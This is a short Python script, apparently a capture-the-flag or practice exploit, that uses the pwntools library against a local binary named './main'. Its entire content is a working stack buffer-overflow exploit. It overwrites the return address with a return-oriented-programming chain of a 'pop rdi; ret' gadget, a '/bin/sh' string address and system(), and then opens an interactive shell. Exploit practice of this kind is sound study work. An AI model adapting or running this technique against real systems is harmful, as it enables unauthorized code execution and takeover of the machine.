from pwn import *

# Start the process
p = process('./main')

# Fill 64 bytes + 8 (saved RBP)
padding = b"A" * 72

# Address of `pop rdi; ret` gadget
pop_rdi = p64(0x401123)

# Address of "/bin/sh" string (or place it in memory and use its address)
bin_sh = p64(0x404080)

# Address of system() (in libc or binary)
system = p64(0x401050)

payload = padding + pop_rdi + bin_sh + system

p.sendline(payload)
p.interactive()
